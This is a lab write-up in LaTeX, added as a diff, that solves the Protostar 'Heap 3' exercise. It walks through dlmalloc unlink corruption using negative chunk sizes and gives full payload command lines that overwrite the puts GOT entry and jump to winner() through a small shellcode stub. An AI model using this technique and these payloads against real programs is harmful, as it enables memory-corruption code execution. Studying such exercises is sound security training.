@@ -1,0 +1,188 @@
+
+\begin{center}\begin{LARGE}Heap 3\end{LARGE}\end{center}
+ 
+\subsection*{Problem}
+
+We now see that we have 3 \code{malloc} calls sequentially followed by \code{free}
+in the reverse order. Let's try to fill the buffer and examine the heap.
+
+\begin{lstlisting}[language=bash]
+run `python -c "print 'A' * 32"` `python -c "print 'B' * 32"` `python -c "print 'C' * 32"`
+
+x/35x 0x804c000
+>>>0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
+>>>0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
+>>>0x804c020:      0x41414141      0x41414141      0x00000000      0x00000029
+>>>0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
+>>>0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
+>>>0x804c050:      0x00000000      0x00000029      0x43434343      0x43434343
+>>>0x804c060:      0x43434343      0x43434343      0x43434343      0x43434343
+>>>0x804c070:      0x43434343      0x43434343      0x00000000      0x00000f89
+>>>0x804c080:      0x00000000      0x00000000      0x00000000
+\end{lstlisting}
+
+We can see how there is a chunk before the start of the string and there is also
+an empty chunk in after the string. We also examine the heap after \code{free}
+to figure out what the heap is like upon freeing the memory.
+
+\begin{lstlisting}[language=bash]
+x/35x 0x804c000
+>>>0x804c000:      0x00000000      0x00000029      0x0804c028      0x41414141
+>>>0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
+>>>0x804c020:      0x41414141      0x41414141      0x00000000      0x00000029
+>>>0x804c030:      0x0804c050      0x42424242      0x42424242      0x42424242
+>>>0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
+>>>0x804c050:      0x00000000      0x00000029      0x00000000      0x43434343
+>>>0x804c060:      0x43434343      0x43434343      0x43434343      0x43434343
+>>>0x804c070:      0x43434343      0x43434343      0x00000000      0x00000f89
+>>>0x804c080:      0x00000000      0x00000000      0x00000000  
+\end{lstlisting}
+
+Here we can see that the first chunk of \code{c} now points to nothing and we notice
+that for the other 2 variables, it now points to the address of the preceding
+variable. For instance, after free, the first address of \code{b} now points to
+the first address of \code{c}. This hints that there is some form of linked list
+established. We search online for how dlmalloc works and we find the following
+structure.
+
+\begin{lstlisting}[language=bash]
+  struct malloc_chunk {
+    INTERNAL_SIZE_T		prev_size;
+    INTERNAL_SIZE_T		size;
+    struct malloc_chunk*	fd;
+    struct malloc_chunk*	bk;
+  }
+\end{lstlisting}
+
+We can infer that on \code{free} the fd pointer is being set correctly, but
+the other pointers are not being updated. We search the documentation for more
+information and we find out that the reason for this is because of \textbf{fastbin}.
+Fastbin has the property of having the same size and stored in a single-linked-list.
+
+We also observe that size is \code{0x00000029} which holds the value of decimal
+41. Looking at the malloc implementation, we see that the size of malloc runs
+in multiple of 8, and that the first 3 bits are flags used to indicate
+\code{[Allocated Arena,MMap,Previous chunk in use]}. Thus, we can see that the
+size of the chunk is 40 and that \code{Previous chunk in use} is set.
+
+Why is this important? We have 2 pointers for each chunk, fd and bk, which we
+can use to manipulate the address that we want to target. However, Fastbin property
+is causing the bk pointer to not update as expected, thus we want to also modify
+the chunk such that it is perceived to be a normal chunk. On searching the internet
+we find that we can do so by modifying the size of the chunk through use of negative
+numbers to trick the allocator. The specifics can be found here http://phrack.org/issues/57/9.html
+By supplying a value of $-4$, we now will have the previous chunk starting 4 bytes
+before the current chunk. Now that have bypassed the fastbin issue, we now need
+to look into how the memory for a normal chunk is freed.
+
+On inspection, we see that \code{unlink} is called instead, which will perform the
+following 2 update as shown below. 
+Writes the value of P->bk to the memory address pointed to by (P->fd) + 12.
+Writes the value of P->fd to the memory address pointed to by (P->bk) + 8.
+This means that for our address modification, we must take
+note to minus the offset.
+
+\begin{lstlisting}[language=bash]
+  *(P->fd + 12) = P->bk
+  *(P->bk + 8) = P->fd
+\end{lstlisting}
+
+We notice that on \code{main+172} that \code{puts} is also called, which we can
+potentially modify to call \code{winner} instead. With all this, we can proceed
+to try to attack the code.
+
+\subsection*{Idea and Attack process}
+
+We now have an idea of what our 2nd parameter should be. It would first write 32
+bytes followed by the 2 negative numbers denoted in hex ($-4$)
+as \code{prev_size} and \code{size}, followed by a
+filler for alignment and the address of \code{puts} in the GOT table
+and the address of the function \code{winner}. We also have to note that we must
+$-12$ from the address of \code{puts} because of the 
+
+\begin{lstlisting}[language=bash]
+objdump -TR /opt/protostar/bin/heap3 | grep puts
+>>>00000000      DF *UND*  00000000  GLIBC_2.0   puts
+>>>0804b128 R_386_JUMP_SLOT   puts
+
+print &winner
+>>>$1 = (void (*)(void)) 0x8048864 <winner>
+
+run A `python -c "print 'A' * 32 + '\xfc\xff\xff\xff'*2 + 'A' * 4 + '\x1c\xb1\x04\x08\x64\x88\x04\x08'"` D
+>>>Program received signal SIGSEGV, Segmentation fault.
+>>>0x08049906 in free (mem=0x804c058) at common/malloc.c:3638
+>>>3638    in common/malloc.c
+p $_siginfo._sifields._sigfault
+>>>$1 = {si_addr = 0x804886c}
+\end{lstlisting}
+
+To explain what is going on, recall how the \code{unlink} function works. It will
+first attempt to write the address of \code{winner} in the address \code{0804b11c + 12}
+which is the the GOT table
+pointing to \code{puts}. Then, afterwards, it will write \code{0804b11c} to
+\code{0x8048864+8}.
+
+\begin{center}
+  \includegraphics[width=0.5\textwidth]{"unlink diag.png"}
+\end{center}
+
+We realize that the \code{unlink} function tries to write to \code{0x8048864+8} which
+is a text segment of the code. On searching, we find out that this segment is a
+read only segment and thus, when \code{unlink} tries to write to the address that
+we injected, it runs into an error. We try instead to inject an address that we
+know we can write to, such as an address that resides in our heap.
+
+Now, if we were to point to an address within our heap, then we need a mechanism
+to run \code{winner}. We search online and we find that we are able to use a shellcode
+to jump to \code{winner}. Through searching online, I found that we can call a push
+of the address and ret to get the function running.
+
+We can place this string in our first variable \code{a} and set the previously
+unwrittable address location to point to our shell code. Since free will modify
+the first chunk (4bytes) of the allocated memory, we will structure the first
+injected parameter to be \code{[4 bytes filler][Shellcode]}. We know that \code{a}
+starts at \code{0x804c008} and thus we will point to \code{0x804c00c} a +4 offset
+because of the filler that we are adding.
+
+\begin{lstlisting}[language=bash]
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash]
+./heap3 `python -c "print 'AAAA\x68\x64\x88\x04\x08\xc3'"`
+  `python -c "print 'A' * 32 + '\xfc\xff\xff\xff'*2 + 'A' * 4 + '\x1c\xb1\x04\x08\x0c\xc0\x04\x08'"` C
+>>>that wasn't too bad now, was it? @ 1713054815
+\end{lstlisting}
+
+\subsection*{Source code}
+
+\begin{lstlisting}[language=c]
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+void winner()
+{
+  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  char *a, *b, *c;
+
+  a = malloc(32);
+  b = malloc(32);
+  c = malloc(32);
+
+  strcpy(a, argv[1]);
+  strcpy(b, argv[2]);
+  strcpy(c, argv[3]);
+
+  free(c);
+  free(b);
+  free(a);
+
+  printf("dynamite failed?\n");
+}
+\end{lstlisting}
